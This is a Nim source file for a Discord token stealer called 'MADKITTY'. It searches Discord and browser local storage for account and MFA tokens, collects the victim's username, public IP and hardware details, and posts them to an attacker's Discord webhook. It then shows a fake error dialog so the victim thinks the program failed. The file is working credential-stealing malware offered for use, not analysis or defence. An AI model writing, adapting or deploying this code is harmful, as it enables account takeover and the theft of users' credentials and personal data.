import json, puppy, os, regex, strformat, winim
from sequtils import deduplicate, concat
from strutils import replace, endswith, strip


let 
  webhook = " YOUR WEBHOOK "
  user_id = "here" # who to ping
  
const # Y Yes , N No
  sendIP: char = 'Y' 
  embed:  char = 'Y' 
  check:  char = 'Y' 
  
var
  tkpaths: seq[string] = @[]
  tokens : seq[string] = @[]
  hooktks = ""

let 
  roaming = getenv("appdata")
  local   = getenv("localappdata")
  user    = getenv("username") 
  
  paths   = [
    roaming / "Discord", 
    roaming / "discordcanary", 
    roaming / "Lightcord",
    roaming / "discordptb",
    roaming / "Opera Software" / "Opera Stable",
    roaming / "Opera Software" / "Opera GX Stable",
    local / "Vivaldi" / "User Data" / "Default",       
    local / "Microsoft" / "Edge" / "User Data" / "Default",  
    local / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
    local / "Google" / "Chrome" / "User Data" / "Default",
    local / "Yandex" / "YandexBrowser" / "User Data" / "Default", 
  ]
  
const reg = [re"(?i-u)[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"(?i-u)mfa\.[\w-]{84}"]

proc whoami*() : string = #thx m4ul3r
    var 
        buf : array[257, TCHAR] # 257 is UNLEN+1 (max username length plus null terminator)
        lpBuf : LPWSTR = addr buf[0]
        pcbBuf : DWORD = int32(len(buf))

    discard GetUserName(lpBuf, &pcbBuf)
    for character in buf:
        if character == 0: break
        result.add(char(character))

proc getGpuInfo*(): string =
  when defined(posix):
    var (gpu_driver_name, exitCode) = execCmdEx("""lspci -nnk | awk -F ': ' \ '/Display|3D|VGA/{nr[NR+2]}; NR in nr {printf $2 ", "; exit}'""")
    if exitCode == 0:
      gpu_driver_name = gpu_driver_name.split(",")[0]
      if gpu_driver_name == "nvidia":
        var (gpu_name, exitCodeSmi) = execCmdEx("nvidia-smi --query-gpu=name --format=csv,noheader")
        if exitCodeSmi != 0:
          echo "nvidia-smi command failed with exit code: {exitCodeSmi}"
          quit(2)
        return gpu_name
      return gpu_driver_name.toUpperAscii()
    else:
      echo fmt"GpuInfo error code: {exitCode}"
      quit(2)

proc getCpuInfo*(): string =
  when defined(posix):
    var (cpu_name, _) = execCmdEx("""cat /proc/cpuinfo | awk -F '\\s*: | @' '/model name|Hardware|Processor|^cpu model|chip type|^cpu type/ { cpu=$2; if ($1 == "Hardware") exit } END { print cpu }' "$cpu_file" """)
    return cpu_name

let
    uname = whoami()
    host = hostOS
    cpu = getCpuInfo()
    gpu = getGpuInfo()



proc femboyporn()=
    for path in paths:
        var path = path & r"\Local Storage\leveldb"
        if dirExists(path):
            try:
                setCurrentDir(path)
                for file in walkDirRec path:
                    if file.endswith("log"):   
                        tkpaths.add(file)
                    elif file.endswith("ldb"): 
                        tkpaths.add(file)
                    else: continue
            except OSError: continue
            
            for file in tkpaths: 
                var cont = file.readFile
                cont = cont.replace("\n", "")
                for r in reg:
                    for f in findAll(cont, r):
                        tokens.add cont[f.boundaries]
        else: continue


    if tokens.len == 0: 
        tokens.add("No tokens found!") 
        
    tokens = tokens.deduplicate 
    for c in tokens: hooktks.add(c & "\n")
    hooktks = &"```\n{hooktks.strip(leading=false)}```"


    when sendIP == 'Y': 
        let ip: string = fetch("https://api.ipify.org/")
        let begin = &"<@{user_id}> Victim: **{user}** | IP Address: **{ip}** \n**__Tokens grabbed by MADKITTY__**:\n"
    else:
        let ip: string = "Not Enabled"
        let begin = &"<@{user_id}> Victim: **{user}**\n**__Tokens grabbed by MADKITTY__**:\n"
        
    when embed == 'Y':
        var data = %*{ 
            "username": "Mad Kitty", 
            "content": &"<@{user_id}>",
            "embeds": [
                { 
                    "title": "sz [@] MADKITTY !",
                    "fields": [
                        {
                            "name": "[*] Victim",
                            "value": "**" & user & "**",
                            "inline": true

                        },
                        {
                            "name": "[*] IP Address",
                            "value": "**" & ip & "**",
                            "inline": true
                        },
                        {
                            "name": "[*] PC Info",
                            "value": uname & " - " & host & " - " & cpu & " - " & gpu & " - ",
                            "inline": true
                        }
                    ]
                },
                {
                    "title": "__**Tokens Grabbed:**__",
                    "fields": [
                        {
                            "name": "Total tokens: " & $tokens.len, 
                            "value": hooktks,
                        },
                    ]
                }
            ]
        }
    else: 
        var data = %*{ "content": begin & hooktks, "username": "Error" }


    let post = Request( # Upload tokens
    url: parseUrl(webhook),
    verb: "POST",
    headers: @[Header(
        key: "Content-Type", 
        value: "application/json"
    ), Header(
        key: "User-Agent",
        value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
    )],
    body: $data
    )

    try: discard fetch(post)
    except PuppyError: discard


const meow = "(⁠≧⁠▽⁠≦⁠)" 

femboyporn()
MessageBox(0, "Error: Failure to find PTR at 0x000000078 .\nPlease make sure your Application is open at Execution", "Error", 0) # Fake Error Message to make ppl think its not Working ;D 


